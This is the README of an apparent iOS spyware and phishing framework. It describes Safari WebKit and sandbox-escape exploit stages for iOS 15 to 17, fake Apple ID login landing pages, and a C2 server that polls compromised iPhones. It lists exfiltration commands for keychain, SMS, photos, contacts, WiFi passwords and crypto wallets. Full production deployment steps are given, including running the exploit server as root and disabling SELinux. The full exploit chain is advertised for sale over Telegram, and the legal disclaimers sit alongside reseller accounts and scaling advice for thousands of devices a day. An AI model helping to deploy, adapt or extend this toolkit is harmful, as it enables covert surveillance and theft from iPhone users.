# Coruna — iOS Research Framework (English)

<a id="english-version"></a>

> ⚠️ **This repository is intended solely for authorized security research, CTF competitions, and educational demonstrations.** Testing on any device without authorization is illegal. The author assumes no liability for any consequences arising from misuse.

***

## ⚖️ Legal Notice & Risk Disclosure

### 🚨 Read Before Use

- This project is intended **solely for authorized security research, vulnerability verification, CTF competitions, and classroom teaching**.
- Before running this project on any device, **you must obtain written authorization from the device owner**. Reading another person's contacts, SMS, photos, keychain, location, or other sensitive data without authorization violates laws including Article 253-1 (Crime of Infringement on Citizens' Personal Information), Article 285 (Crime of Illegal Intrusion into Computer Information Systems), and Article 286 (Crime of Destroying Computer Information Systems) of the Criminal Law of the People's Republic of China, as well as the U.S. Computer Fraud and Abuse Act (CFAA), the EU General Data Protection Regulation (GDPR), and other applicable laws.
- The author **does not provide or sell** any attack capability against real devices, nor any "attack-on-behalf" service targeting specific victims. This code is for learning and defensive research only.
- **Delete within 24 hours after download.** If long-term retention is needed, keep only the readable, non-executable source snippets for academic citation.
- The author is not responsible for any legal consequences arising from improper use of the code in this repository. Downloading/cloning/using constitutes acceptance of this notice.

### 📞 Commercial Support & Full Project

This repository contains **only framework code and documentation**. It does NOT include real exploitation binaries, native bridge payloads, keychain derivation strings, or version offset tables.

- The **full project** (including iOS 16.2 / 16.6 / 17.x adapted Stage1 WASM exploit, Stage3 native bridge, powerd injection dylib) is **not provided for free**.
- For fast research support, version adaptation, custom payload compilation, or binary exploit chain completion, contact:

| Contact      | Address                |
| ------------ | ---------------------- |
| **Telegram** | <https://t.me/xynapsex> |

- **Technical support pricing: 250 USD** one-time fee, includes one full exploit chain integration and one iOS version adaptation.
- Only accepts **legally authorized research** inquiries. **No attack commissions against real victims will be accepted.**

***

## 📋 Project Overview

Coruna is an end-to-end C2 framework for iOS Safari sandbox escape and post-exploitation research, consisting of three independent yet cooperating services:

| Port     | Service                       | Entry File                       | Purpose                                                                            |
| -------- | ----------------------------- | -------------------------------- | ---------------------------------------------------------------------------------- |
| **5173** | Frontend Vue dev server       | `veu/package.json` `scripts.dev` | Local development (HMR)                                                            |
| **7000** | Backend Admin API (FastAPI)   | `server/admin/main.py`           | Admin login / command dispatch / devices / audit / stats                           |
| **7070** | Exploit delivery + C2 landing | `server/exploit_server.py`       | Phishing/exploit entry for iOS Safari: `/ch/<slug>`, `/group.html`, `/cmd` polling |

### Architecture Overview

```
d:\wwwroot\coruna\
├─ server/                          Backend: FastAPI + SQLAlchemy + SQLite
│   ├─ admin/                       FastAPI app entry + routers + ORM + config
│   │   ├─ main.py                  Entry (frontend hosting / SSE / security headers middleware)
│   │   ├─ auth.py                  JWT + 2FA authentication
│   │   ├─ agent_auth.py            Agent role (reseller account) separate auth
│   │   ├─ database.py              SQLAlchemy ORM + normalize_device_uuid
│   │   ├─ schemas.py               Pydantic models
│   │   ├─ config.py                .env loader + SECRET_KEY validation
│   │   ├─ config_constants.py      Single source of truth for all tunable thresholds
│   │   ├─ settings_manager.py      settings table read/write
│   │   ├─ limiter.py               slowapi rate limiter
│   │   ├─ wallet_parser.py         Wallet data parser
│   │   ├─ .env / .env.sample       Backend core config (key/CORS/rate-limit, must change in prod)
│   │   └─ routers/
│   │       ├─ *.py                 Admin routers (16: devices/commands/exfil/...)
│   │       ├─ agent/               Agent router subpackage (8)
│   │       ├─ _helpers.py          Shared helpers
│   │       └─ _rotate_logs.py      Log archive daemon
│   ├─ exploit_server.py            Port 7070: exploit delivery + C2 phishing landing
│   ├─ platform_module.js           WebKit PAC bypass + memory read/write primitives
│   ├─ utility_module.js            Utility module
│   ├─ group.html                   Main exploit entry (document.URL spoofing to prevent OOB)
│   ├─ Stage1_*.js                  iOS version-specific Stage1 WASM exploit (4 versions)
│   │   ├─ Stage1_15.2_15.5_jacurutu.js       iOS 15.2 - 15.5
│   │   ├─ Stage1_15.6_16.1.2_bluebird.js      iOS 15.6 - 16.1.2
│   │   ├─ Stage1_16.2_16.5.1_terrorbird.js    iOS 16.2 - 16.5.1
│   │   └─ Stage1_16.6_17.2.1_cassowary.js     iOS 16.6 - 17.2.1
│   ├─ Stage2_*.js                  Stage2 chain builders (5 versions)
│   │   ├─ Stage2_15.0_16.2_breezy15.js
│   │   ├─ Stage2_16.3_16.5.1_seedbell.js
│   │   ├─ Stage2_16.6_16.7.12_seedbell.js
│   │   ├─ Stage2_16.6_17.2.1_seedbell_pre.js
│   │   └─ Stage2_17.0_17.2.1_seedbell.js
│   ├─ Stage3_VariantA.js           Sandbox escape - Variant A
│   ├─ Stage3_VariantB.js           Sandbox escape - Variant B (primary)
│   ├─ payloads/
│   │   ├─ post_exploit.js          Post-exploitation command execution + C2 polling
│   │   ├─ manifest.json            Encrypted payload manifest (19 flags)
│   │   ├─ bootstrap.dylib          Bootstrap dylib
│   │   └─ <hash>/                 Module-hash organized encrypted payloads (dylib + bin)
│   ├─ templates/                   Phishing HTML templates (index.html / frame.html)
│   ├─ requirements.txt             Python dependencies
│   ├─ darksword.db                 SQLite database (auto-generated, do not commit)
│   ├─ logs/                        Runtime logs (auto-generated, includes devices/YYYYMMDD/UUID.log)
│   ├─ logs_archive/                Archived logs (auto-generated)
│   ├─ exfil/                       Exfiltrated data drop directory (runtime, do not commit)
│   └─ frontend/dist/               Frontend build output (backend can host, runtime-generated)
│
├─ veu/                             Frontend: Vue 3 + Element Plus + Vite + ECharts
│   ├─ src/
│   │   ├─ views/                   Pages (Dashboard / Devices / DeviceDetail / Commands / Exfil / Channels / Templates / Agents / Users / AuditLog / Settings / Login / Profile / Logs / Notifications / Scripts / FileBrowser / Wallets / Keychain / Contacts / SMS / Calls / WiFi / Photos)
│   │   ├─ stores/                  Pinia state
│   │   ├─ router/                  Vue Router (history mode)
│   │   ├─ utils/
│   │   │   ├─ axios.js             Request wrapper (baseURL empty, proxy-friendly)
│   │   │   └─ twofa.js             2FA utilities
│   │   └─ constants/               Frontend constants
│   ├─ vite.config.js               Vite config (proxy reverse proxy / SSE handling)
│   ├─ index.html
│   └─ package.json                 Frontend deps & dev/build/preview scripts
│
├─ 完整部署教程_后端启动+前端启动+打包+宝塔面板.md  (Chinese deployment guide)
├─ iOS 完整利用 + C2 执行流程（10 步端到端）.md       (Chinese 10-step iOS flow)
└─ README.md                       This file
```

***

## 🎯 Features

### Admin Dashboard (Vue Frontend)

- **Dashboard**: 16 stat cards + 6 charts (device status / command status / top models / top channels / exfil distribution / 7-day trend)
- **Device Management**: list, detail, heartbeat timeline, exploit progress bar (7-stage visualization), access log terminal
- **Command Execution**: command history, status filtering, manual retry, quick templates, batch execution
- **Data Exfiltration**: sandbox / keychain / WiFi / contacts / SMS / calls / photos / files / wallet categorized preview & download
- **Channel Management**: phishing landing config, domain whitelist, template binding
- **Template Management**: editable HTML templates (e.g., fake Apple ID login)
- **Audit Log**: login / command / data operation full audit

### C2 Backend (FastAPI 7000)

- JWT auth + 2FA support + rate limiting
- 8 modules: devices / commands / exfil / channels / templates / agents / users / audit
- SSE real-time notification stream (device online, command execution, data return)
- Single-port frontend hosting after build (no separate Nginx needed)

### Exploit Service (7070)

- Channel phishing landing: `/ch/<slug>?tpl=<tpl>`
- Device registration: 3-tier UUID resolution (query → cookie → referer) + 40+ crawler UA blocking
- C2 command dispatch: 5-step state machine (fake completed reset → stale reset → Safari prefix filter → deferred backoff → concurrency guard)
- Result writeback: `/cmd_result` + exfil persistence (34 prefixes → 9 categories → auto file extension)
- Async reporting: 3 daemon threads → 7000 (device register / exploit report / device data)

***

## 🚀 Quick Start

### Requirements

| Software | Min Version | Recommended |
| -------- | ----------- | ----------- |
| Python   | 3.10        | 3.11 / 3.12 |
| Node.js  | 18          | 20 LTS      |
| npm      | 9           | 10+         |

### 1. Start Backend (Port 7000)

```bash
# ① Enter backend directory (must run from server/ or admin.* import fails)
cd d:\wwwroot\coruna\server          # Windows
# cd /www/wwwroot/coruna/server      # Linux

# ② Install dependencies
python -m pip install -r requirements.txt
# CN mirror: -i https://pypi.tuna.tsinghua.edu.cn/simple

# ③ Start (dev mode)
python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000 --reload
```

Success indicators:

```
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:7000
```

- Default admin: `admin` / `admin123` (**must change in production**)
- Swagger docs: <http://127.0.0.1:7000/docs>

### 2. Start Frontend (Port 5173, local dev only)

```bash
cd d:\wwwroot\coruna\veu
npm install --no-audit --no-fund
npm run dev
```

Open <http://localhost:5173/> to login. Vite proxy is preconfigured (`/api → 7000`, `/ch/* → 7070`), no baseURL change needed.

### 3. Start exploit\_server (Port 7070)

```bash
cd d:\wwwroot\coruna\server
python exploit_server.py --port 7070
```

Verification:

| URL                                                                   | Expected                 |
| --------------------------------------------------------------------- | ------------------------ |
| <http://127.0.0.1:7070/group.html>                                    | HTML response (HTTP 200) |
| <http://127.0.0.1:7070/ch/demomobanb?ch=demomobanb&tpl=appleid-login> | Phishing landing page    |

### One-Click Local Start (3 terminals)

```powershell
# Terminal 1: Backend 7000
cd d:\wwwroot\coruna\server ; python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000 --reload

# Terminal 2: Frontend 5173
cd d:\wwwroot\coruna\veu ; npm run dev

# Terminal 3: Exploit 7070
cd d:\wwwroot\coruna\server ; python exploit_server.py --port 7070
```

***

## 📦 Production Deployment (BT Panel / aaPanel on Linux)

### 1. Modify Production Config (**Required**)

Edit `/www/wwwroot/coruna/server/admin/.env`:

```dotenv
# ① Generate new SECRET_KEY
# Command: python -c "import secrets; print(secrets.token_urlsafe(64))"
SECRET_KEY=replace_with_64_char_random_string

# ② CORS_ORIGINS: add your domains
CORS_ORIGINS=https://admin.yourdomain.com,https://ch.yourdomain.com,http://127.0.0.1:7000

# ③ DARKSWORD_PUBLIC_BASE: public 7070 access URL
DARKSWORD_PUBLIC_BASE=http://your-server-public-ip:7070
```

### 2. Install Backend Dependencies + Init DB

```bash
cd /www/wwwroot/coruna/server
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### 3. Deploy Backend via BT "Python Project Manager" (Port 7000)

| Field                | Value                                                            |
| -------------------- | ---------------------------------------------------------------- |
| Project Name         | `coruna_admin`                                                   |
| Path                 | `/www/wwwroot/coruna/server`                                     |
| Python Version       | 3.11 / 3.12                                                      |
| Framework            | `uvicorn`                                                        |
| Startup Mode         | `Module`                                                         |
| Module Name          | `admin.main:app`                                                 |
| Run Args             | `--host 0.0.0.0 --port 7000 --workers 4 --timeout-keep-alive 75` |
| Install Dependencies | ✅ checked                                                        |

### 4. Build Frontend and Deploy to Backend Hosting

```bash
cd /www/wwwroot/coruna/veu
npm install --no-audit --no-fund
npm run build
rm -rf /www/wwwroot/coruna/server/frontend
mkdir -p /www/wwwroot/coruna/server/frontend
cp -rf /www/wwwroot/coruna/veu/dist /www/wwwroot/coruna/server/frontend/
```

Verify: `curl -sS http://127.0.0.1:7000/ | head -5` should show `<!doctype html>`.

### 5. Supervisor Daemon for exploit\_server (Port 7070)

BT Panel → Software Store → **Supervisor Manager** → Add daemon:

| Field       | Value                                                                      |
| ----------- | -------------------------------------------------------------------------- |
| Name        | `coruna_exploit`                                                           |
| User        | `root`                                                                     |
| Working Dir | `/www/wwwroot/coruna/server`                                               |
| Command     | `/www/wwwroot/coruna/server/venv/bin/python exploit_server.py --port 7070` |
| Log File    | `/www/wwwroot/coruna/server/logs/exploit_server.log`                       |

### 6. Nginx Reverse Proxy Config

**Admin domain** (admin.yourdomain.com → 7000):

```nginx
server {
    listen 80;
    listen 443 ssl http2;
    server_name admin.yourdomain.com;
    ssl_certificate     /www/server/panel/vhost/cert/admin.yourdomain.com/fullchain.pem;
    ssl_certificate_key /www/server/panel/vhost/cert/admin.yourdomain.com/privkey.pem;

    client_max_body_size 200M;

    map $http_upgrade $connection_upgrade {
        default upgrade;
        '' close;
    }

    location / {
        proxy_pass http://127.0.0.1:7000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_buffering off;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }

    # 7070 exploit service via same-domain /ch-path
    location ~ ^/(ch|if|t|sdk|group|stage|report|payloads|cmd|cmd_result|cmd_push|upload)/ {
        proxy_pass http://127.0.0.1:7070;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 300s;
    }
}
```

**Channel domain** (ch.yourdomain.com → 7070, optional):

```nginx
server {
    listen 80;
    listen 443 ssl http2;
    server_name ch.yourdomain.com;
    ssl_certificate     /www/server/panel/vhost/cert/ch.yourdomain.com/fullchain.pem;
    ssl_certificate_key /www/server/panel/vhost/cert/ch.yourdomain.com/privkey.pem;

    client_max_body_size 200M;

    location / {
        proxy_pass http://127.0.0.1:7070;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 300s;
        add_header Cache-Control "no-store, no-cache";
    }
}
```

After changes: `nginx -t && nginx -s reload`

### 7. Deployment Verification Checklist

| # | Check                                 | Pass Criteria                                                                                   |
| - | ------------------------------------- | ----------------------------------------------------------------------------------------------- |
| 1 | Visit `https://admin.yourdomain.com/` | Login page, valid cert                                                                          |
| 2 | Login with `admin` + new password     | Redirects to Dashboard, no 401/403                                                              |
| 3 | F12 → Network → `stream`              | Status 200, persistent Pending                                                                  |
| 4 | Dashboard loads                       | 8 cards + charts with data                                                                      |
| 5 | Channel list opens                    | List visible                                                                                    |
| 6 | Public channel URL                    | `https://ch.yourdomain.com/ch/demomobanb?ch=demomobanb&tpl=appleid-login` shows fake Apple page |
| 7 | Command dispatch                      | Device → send `ds_info` → enters pending list                                                   |
| 8 | Server restart                        | Nginx / Python / exploit\_server auto-start                                                     |

***

## 🔬 iOS Exploit + C2 Execution Flow (10 Steps End-to-End)

```
User iPhone Safari visits URL
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 1  Phishing Landing: /ch/<slug>?tpl=<tpl>    exploit 7070    │
 │         Channel/template/domain security check → register device  │
 │         → 302 redirect to /group.html                            │
 └──────────────────────────────────────────────────────────────────┘
        │  HTTP 302 (Cookie sets ds_uuid/ds_chid/ds_tpid)
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 2  group.html main exploit entry                            │
 │         Object.defineProperty fakes document.URL=origin/group.html
 │         Restores ds_uuid from cookie / localStorage              │
 │         Loads platform_module.js + utility_module.js             │
 └──────────────────────────────────────────────────────────────────┘
        │  <script src="/platform_module.js">
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 3  platform_module: WebKit PAC bypass + memory primitives   │
 │         exploitPrimitive: addrof() / readRawBigInt() / read32()  │
 │         struct offsets config + 0xFEEDFACF Mach-O scan            │
 └──────────────────────────────────────────────────────────────────┘
        │  exploitPrimitive initialized → can read/write Safari memory
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 4  Stage decryption container                               │
 │         (ChaCha20+F00DBEEF+LZMA+19 manifest flags)               │
 │         Two hash module IDs decrypt → Stage3 injected             │
 │         Provides native call bridge window.c + file.* primitives │
 └──────────────────────────────────────────────────────────────────┘
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 5  Device registration + heartbeat: 7070 → DB → 7000 notify│
 │         _ensure_device_registered() → UA anti-crawler (40+ marks)│
 │         update_device_in_db() → notify_admin_register_async()     │
 └──────────────────────────────────────────────────────────────────┘
        │  Safari post_exploit.js polls GET /cmd every 3s
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 6  C2 command dispatch state machine: get_pending_commands()│
 │   0. Reset fake completed (empty/[SKIP]/<2 bytes/[DEFER] → pending)│
 │   1. Reset stale executing (A: 60s / B: 120s stuck → pending)    │
 │   2. UA identify Safari vs native: SAFE_SAFARI_PREFIXES 30+ filter│
 │   3. Deferred 30s backoff (avoid [DEFER-native] tight loop)     │
 │   4. MAX_CONCURRENT=1 concurrency guard                          │
 └──────────────────────────────────────────────────────────────────┘
        │  Returns JSON: [{id, command}]  or  204 No Content
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 7  post_exploit.js command execution                        │
 │   Safari immediate: ds_info / ds_alert / ds_location(web) / ui.* │
 │   Requires Stage3 native bridge: ds_exfil_* / ds_keychain /      │
 │                                  ds_photos / file.read / shell.* │
 │   Bridge unavailable: returns [DEFER-native][reason]             │
 └──────────────────────────────────────────────────────────────────┘
        │  After execution → POST /cmd_result {id, output, status}
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 8  Result writeback + exfil persistence: update_command_result()
 │   [DEFER-*] → status=deferred (30s backoff start point)         │
 │   Normal → status=completed + output to DB                       │
 │   _persist_cmd_output_as_exfil(): 34 prefixes → category mapping │
 │   → write server/exfil/ + ExfilData table → admin exfil download │
 └──────────────────────────────────────────────────────────────────┘
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 9  Report/data return API bridge: 7070 → 7000 (3 threads)  │
 │   ① POST /stage & /report → forward_exploit_report_async         │
 │   ② POST /upload (device data blob) → forward_device_data_async  │
 │   ③ GET /?e=0 legacy → UA+IP 3600s window match recent device   │
 └──────────────────────────────────────────────────────────────────┘
        │
        ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │ STEP 10 Admin dashboard closed loop: 7000 FastAPI → 5173 Vue     │
 │   Admin: add command/channel/template → darksword.db Command pending│
 │   ↕ Next Safari /cmd poll picks up → executes → /cmd_result      │
 │   Dashboard 16 cards + 6 charts real-time refresh                │
 └──────────────────────────────────────────────────────────────────┘
```

### C2 Command State Machine

```
User creates command → [pending]
   │  Safari polls GET /cmd → selected → DB changes to 'executing'
   ▼
[executing] ──┬─ POST /cmd_result status=completed,output=xxx → [completed] → exfil persist
              ├─ POST /cmd_result status=failed → [failed]
              ├─ POST /cmd_result status=error → [error]
              └─ POST /cmd_result output=[DEFER-*] → [deferred]
                                                  │ after 30s
                                                  ▼
                                              [retry → pending candidate]
```

### 4 Auto-Reset Paths

| Reset Type       | Trigger Condition                                      | Code Location              |
| ---------------- | ------------------------------------------------------ | -------------------------- |
| ① Fake completed | output empty/\[SKIP]/\[DEFER]/<2 chars                 | exploit\_server.py:628-651 |
| ② Stale A        | executing + never had executed\_at + created\_at > 60s | exploit\_server.py:654-662 |
| ③ Stale B        | executing + executed\_at > 120s                        | exploit\_server.py:663-669 |
| ④ Deferred retry | deferred + never executed OR executed\_at >= 30s ago   | exploit\_server.py:685-705 |

***

## 📚 Supported iOS Versions

| Stage1 Module                      | Supported iOS Range | Status                                 |
| ---------------------------------- | ------------------- | -------------------------------------- |
| `Stage1_15.2_15.5_jacurutu.js`     | iOS 15.2 - 15.5     | ✅ Framework complete                   |
| `Stage1_15.6_16.1.2_bluebird.js`   | iOS 15.6 - 16.1.2   | ✅ Framework complete                   |
| `Stage1_16.2_16.5.1_terrorbird.js` | iOS 16.2 - 16.5.1   | ✅ Framework complete (verified 16.2)   |
| `Stage1_16.6_17.2.1_cassowary.js`  | iOS 16.6 - 17.2.1   | ✅ Framework complete (verified 16.6.x) |

> ⚠️ Newer iOS versions (e.g., 16.7.11) may fail Stage1 WASM exploit due to Apple security patches. Latest version adaptation requires contacting the author for updated offset tables.

### Exploit Progress Visualization (Admin Device Detail Page)

Device detail page shows a complete 7-stage exploit progress bar:

| Stage                    | Progress | Trigger Condition                                             |
| ------------------------ | -------- | ------------------------------------------------------------- |
| Device Online            | 10%      | `device.first_seen` exists                                    |
| Exploit Page Visit       | 20%      | `device.host` / `access_path` / `referer`                     |
| Payload Load Execute     | 35%      | sandbox data / heartbeat source contains sandbox              |
| Sandbox Escape (Stage3)  | 55%      | `exploit_status=success` / heartbeat contains exploit\_report |
| Post-Exploit Running     | 70%      | heartbeat contains post\_exploit / has commands               |
| C2 Channel Established   | 85%      | `last_command_time` exists / command count > 0                |
| Data Exfiltration Return | 100%     | exfil\_data table has non-sandbox data                        |

***

## 🛠️ Command Reference

### Safari Immediate Execution (no Stage3 native bridge required)

| Command           | Description                                     |
| ----------------- | ----------------------------------------------- |
| `ds_info`         | Device basic info                               |
| `ds_status`       | Device status                                   |
| `ds_alert <msg>`  | Alert popup                                     |
| `ds_notify <msg>` | Notification                                    |
| `ds_vibrate`      | Vibration                                       |
| `ds_location`     | Web geolocation (requires HTTPS + user consent) |
| `ui.*`            | UI series commands                              |

### Requires Stage3 Native Bridge

| Command                                  | Description               |
| ---------------------------------------- | ------------------------- |
| `ds_exfil_keychain`                      | Exfiltrate Keychain       |
| `ds_exfil_sms`                           | Exfiltrate SMS            |
| `ds_exfil_photos`                        | Exfiltrate photos         |
| `ds_exfil_contacts`                      | Exfiltrate contacts       |
| `ds_exfil_calls`                         | Exfiltrate call history   |
| `ds_exfil_wifi`                          | Exfiltrate WiFi passwords |
| `ds_exfil_wallet`                        | Exfiltrate wallet         |
| `file.read` / `file.list` / `file.write` | File primitives           |
| `shell.*` / `execShell`                  | Shell execution           |
| `scanWallet` / `scanAllWallets`          | Wallet scanning           |
| `dumpKeychain` / `dumpMemory`            | Memory/keychain dump      |

> When native bridge is unavailable, all return `[DEFER-native][specific reason]`, with 30s backoff auto-retry by the state machine.

***

## ⚙️ Configuration & Customization

### Key Config Files

| File                             | Purpose                     | Must-Change Items                                     |
| -------------------------------- | --------------------------- | ----------------------------------------------------- |
| `server/admin/.env`              | Backend key/CORS/rate-limit | `SECRET_KEY`, `CORS_ORIGINS`, `DARKSWORD_PUBLIC_BASE` |
| `server/exploit_server.py:23-25` | Backend API URL             | `ADMIN_REGISTER_URL` / `ADMIN_REPORT_URL`             |
| `veu/vite.config.js`             | Frontend proxy              | Dev only, production uses Nginx                       |

### Key Parameter Tuning

| What to change                   | Location                                                      |
| -------------------------------- | ------------------------------------------------------------- |
| Command dispatch max concurrency | `exploit_server.py:777` `MAX_CONCURRENT`                      |
| Stale command reset time         | `exploit_server.py:654` / `667`                               |
| Deferred retry backoff           | `exploit_server.py:688` `min_defer_time`                      |
| Add new Safari command prefix    | `exploit_server.py:727` `SAFE_SAFARI_PREFIXES`                |
| Add new exfil category           | `exploit_server.py:556` `_CMD_CATEGORY_MAP` + `584` `ext_map` |
| Exfil persistence directory      | `exploit_server.py:595` `EXFIL_DIR.mkdir`                     |

***

## ❓ FAQ

<details>
<summary><b>Q1: Windows 'vite' is not recognized as an internal or external command</b></summary>

Cause: frontend dependencies not installed. Fix:

```bash
cd d:\wwwroot\coruna\veu
Remove-Item node_modules -Recurse -Force
npm install
npm run dev
```

</details>

<details>
<summary><b>Q2: Backend startup error "No module named 'admin'"</b></summary>

Cause: working directory is not `server/`. Fix:

```bash
cd server
python -m uvicorn admin.main:app --host 0.0.0.0 --port 7000
```

</details>

<details>
<summary><b>Q3: All frontend requests return 404</b></summary>

Cause: axios baseURL has duplicate prefix. `veu/src/utils/axios.js` baseURL must be empty string. Dev uses Vite proxy, production uses Nginx reverse proxy.

</details>

<details>
<summary><b>Q4: CORS errors</b></summary>

- Local dev: always open from 5173, Vite proxy is same-origin.
- Production: use single Nginx domain, no CORS issues.
- When adding new domains, update `CORS_ORIGINS` in `server/admin/.env`.

</details>

<details>
<summary><b>Q5: SQLite "database is locked"</b></summary>

- Production `--workers` should not exceed 2.
- Enable WAL mode:

```bash
sqlite3 /www/wwwroot/coruna/server/darksword.db "PRAGMA journal_mode=WAL; PRAGMA synchronous=NORMAL;"
```

- For >5000 devices/day, change `DATABASE_URL` to PostgreSQL.

</details>

<details>
<summary><b>Q6: exploit_server /ch/demomobanb returns 404</b></summary>

Channel `demomobanb` not created. Login admin → Channel Management → New:

- slug: `demomobanb`
- Default template: `Apple ID Login`

</details>

<details>
<summary><b>Q7: BT Nginx 502 Bad Gateway</b></summary>

- Backend uvicorn not running (Python Project Manager shows "stopped").
- Nginx proxy\_pass port is wrong.
- CentOS SELinux not disabled:

```bash
setenforce 0
sed -i 's/^SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config
```

</details>

<details>
<summary><b>Q8: iOS 16.7.x Stage1 failure</b></summary>

Newer iOS versions (e.g., 16.7.11) may have Apple security patches that fix the WASM vulnerability or modify internal offsets. Requires:

1. Obtain specific 16.7.x WebKit JIT offsets
2. Add `{GFx77t: 160700, ...}` entry to `LTgSl5` array in `platform_module.js`
3. If vulnerability is patched, this version is unsupported

Contact the author for latest version adaptation support.

</details>

***

## 📁 Project Structure (Compact)

> Full structure: see "Architecture Overview" above. Only key nodes listed here.

```
coruna/
├─ server/                          # Backend
│   ├─ admin/                       # FastAPI app
│   │   ├─ main.py                  # Entry (frontend hosting / SSE / security headers)
│   │   ├─ auth.py / agent_auth.py  # Admin + Agent dual-track auth
│   │   ├─ database.py              # SQLAlchemy ORM + normalize_device_uuid
│   │   ├─ config.py / config_constants.py  # .env + single source of truth for thresholds
│   │   └─ routers/
│   │       ├─ *.py                  # Admin routers (16: devices/commands/exfil/channels/...)
│   │       └─ agent/               # Agent role router subpackage (8)
│   ├─ exploit_server.py            # Port 7070 exploit + C2
│   ├─ platform_module.js           # WebKit PAC bypass + primitives
│   ├─ utility_module.js            # Utility module
│   ├─ Stage1_*.js                  # 4 version Stage1 WASM exploits
│   ├─ Stage2_*.js                  # 5 version Stage2 chain builders
│   ├─ Stage3_VariantA.js / Stage3_VariantB.js   # Sandbox escape dual variants
│   ├─ group.html                   # Main exploit entry
│   ├─ payloads/
│   │   ├─ post_exploit.js          # Post-exploitation + C2 polling
│   │   ├─ manifest.json            # Encrypted payload manifest
│   │   ├─ bootstrap.dylib          # Bootstrap dylib
│   │   └─ <hash>/                  # Module-hash organized encrypted payloads
│   ├─ templates/                   # Phishing HTML templates
│   ├─ requirements.txt
│   ├─ darksword.db                 # SQLite database (auto-generated)
│   ├─ logs/ / logs_archive/        # Logs and archives (auto-generated)
│   └─ exfil/                       # Exfiltrated data drop (runtime-generated)
│
├─ veu/                             # Frontend
│   ├─ src/
│   │   ├─ views/                   # 25 pages (Dashboard/Devices/DeviceDetail/Commands/Exfil/...)
│   │   ├─ stores/                  # Pinia
│   │   ├─ router/                  # Vue Router
│   │   ├─ utils/axios.js + twofa.js
│   │   └─ constants/
│   ├─ vite.config.js               # Vite + proxy + SSE handling
│   └─ package.json
│
├─ 完整部署教程_后端启动+前端启动+打包+宝塔面板.md  (Chinese deployment guide)
├─ iOS 完整利用 + C2 执行流程（10 步端到端）.md       (Chinese 10-step iOS flow)
└─ README.md                        # This file
```

***

## 🔒 Security Recommendations

### Deployment Security

1. **Must change** **`SECRET_KEY`** **in production** (generate with `python -c "import secrets; print(secrets.token_urlsafe(64))"`).
2. **Change default admin password** (top-right profile after login).
3. **CORS\_ORIGINS** should only list your own domains.
4. **Port 7070** in production should use Nginx HTTPS reverse proxy, not plaintext.
5. **Enable SQLite WAL mode** to avoid high-concurrency write locks.
6. **Regularly backup** **`darksword.db`** **and** **`exfil/`** **directory**.

### Defensive Usage

- Run only in authorized test environments
- Immediately clear `exfil/` directory and `darksword.db` after testing
- Do not run long-term on production servers
- Set `enabled=0` on channels no longer in use

***

## 📜 License & Disclaimer

This repository code is released under the **MIT** license, but:

- **Does NOT include** real exploitation binaries (powerd dylib / SpringBoardTweak / ChaCha20 Key / version offset table)
- **Does NOT provide** attack capability against real devices
- **Does NOT assume** any legal liability for improper use
- Downloading constitutes acceptance of this README's legal notice

The full exploit chain (with real payloads and version adaptation) requires contacting the author:

| Contact      | Address                | Price     |
| ------------ | ---------------------- | --------- |
| **Telegram** | <https://t.me/xynapsex> | 250 USD |

***

## ⚠️ Final Warning

> **Delete within 24 hours after download.**
>
> This project is intended solely for authorized security research, CTF competitions, and educational demonstrations. Testing on any device without authorization is illegal. The author does not provide or sell any attack services against real victims.
>
> **Use legally. You are responsible for your actions.**

***

*Coruna — iOS Research Framework · 2026*
